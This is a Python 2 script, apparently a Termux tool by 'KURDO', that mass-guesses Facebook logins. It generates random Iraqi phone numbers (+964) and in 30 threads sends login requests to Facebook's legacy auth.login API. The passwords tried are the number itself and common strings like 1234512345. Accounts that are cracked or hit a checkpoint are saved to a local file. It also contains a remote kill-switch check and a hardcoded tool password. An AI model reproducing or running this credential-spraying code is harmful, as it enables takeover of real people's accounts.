import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass, time
os.system('rm -rf .txt')
for n in range(3000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('pkg install figlet -y')
    time.sleep(1)
    os.system('python2 KURDO.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)
def Option(): 
  Code = "Tools"
  try: 
    Status = requests.get("https://raw.githubusercontent.com/hal012/kurdo12/main/hech.txt").text 
    if Code in Status: 
      time.sleep(1) 
      pass 
    else: 
      print("\x1b[97mEror 404 Ragirawa\033[97m") 
      time.sleep(1) 
      sys.exit() 
  except: 
    sys.exit() 
    if name == '__main__': 
     print logo 
     Option() 
    
Option()

def t():
    time.sleep(1)


def cb():
    os.system('clear')
#####LOGO####
logo="""
Auther   : KURDO
Telegram : @KU4DO
Channel  : KURDOCRACKER
Create   : @KURDOCRACKER
Note     : Nrxi am toola 0$

--------------------------------------------------
                                """
back = 0
successful = []
cpb = []
oks = []
id = []
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... |'
time.sleep(0.1)
os.system("clear")
os.system("figlet MAFEA")
print '===================\nLoading... /'
time.sleep(0.1)
os.system("clear")
os.system("figlet CHANAL")
print '===================\nLoading... -'
time.sleep(0.1)
os.system("clear")
os.system("figlet TOOL")
print '===================\nLoading... |'
time.sleep(0.1)
os.system("clear")
os.system("figlet FREE")
print '===================\nLoading... /'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... -'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... |'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... /'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... -'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... |'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... /'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... -'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... |'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... /'
time.sleep(0.1)
os.system("clear")
os.system("figlet KURDO")
print '===================\nLoading... -'
time.sleep(0.1)
os.system("clear")
os.system('figlet KURDO')
print '==================='
print logo
CorrectUsername = 'KURDO'
CorrectPassword = 'UP'
loop = 'true'
while loop == 'true':
    username = raw_input('Tool Username: ')
    if username == CorrectUsername:
        password = raw_input('Tool Password: ')
        if password == CorrectPassword:
            print 'Tawawa ' + username
            time.sleep(2)
            os.system('clear')
            loop = 'false'
        else:
            print 'Wrong Password'
            os.system('xdg-open https://t.me/barhamhex')
    else:
        print '\x1b[1;97mWrong Username'
        os.system('xdg-open https://t.me/barhamhex')
        
    os.system("clear")
    os.system("figlet KURDO ")
    print logo
    os.system("python KURDO.py")
def menu():
    os.system('clear')
    print logo
    print '=============='
    print 'PHONE NUMBER IRAQ '
    print '=============='
    print '1- Continue '
    print '0- Exit        '
    print '=============='
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n|==>>>>  ')
    if bch == '':
        print ' Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[32m 770-771-772-773-774\n  750-751-752-753-754\n   780-781-782-783-784\x1b[0;1m\n\x1b[90;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
        try:
            c = raw_input('Choose The Code  : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print 'File Not Found'
            raw_input('\n[ Back ]')
            menu()


    elif bch == '13':
        login()
    elif bch == '0':
        exb()
    else:
        print 'Fill in correctly'
        action()
    xxx = str(len(id))
    psb('Total Numbers: ' + xxx)
    time.sleep(0.5)
    psb('Please wait, Chaware ba...')
    time.sleep(0.5)
    psb('Bo Ragrtni Hack CTRL lagal Press z')
    time.sleep(0.5)
    print ' ------------------------------------------------------- '

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\n\x1b[1;92m\xe2\x95\x94[GOOD]\x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass1
                okb = open('save/cloned.txt', 'a')
                okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass1
                cps = open('save/cloned.txt', 'a')
                cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '1234512345'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass2
                    okb = open('save/cloned.txt', 'a')
                    okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT]\x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass2
                    cps = open('save/cloned.txt', 'a')
                    cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '1122334455'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass3
                        okb = open('save/cloned.txt', 'a')
                        okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass3
                        cps = open('save/cloned.txt', 'a')
                        cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '123456123456'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass4
                            okb = open('save/cloned.txt', 'a')
                            okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass4
                            cps = open('save/cloned.txt', 'a')
                            cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '112233445566'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m\xe2\x95\x94[GOOD] \x1b[1;92m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass5
                                okb = open('save/cloned.txt', 'a')
                                okb.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;36;40m\xe2\x95\x94[CHECKPOINT] \x1b[1;97m\n\xe2\x95\x91ID:' + k + c + user + '\n\xe2\x95\x91PASS:' + pass5
                                cps = open('save/cloned.txt', 'a')
                                cps.write( 'ID:' + k + c + user + '\n' + 'PASS:' + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '         '
    print 'Process Has Been Completed ....'
    print 'Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
    print 'CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 dark-pro.py')


menu()
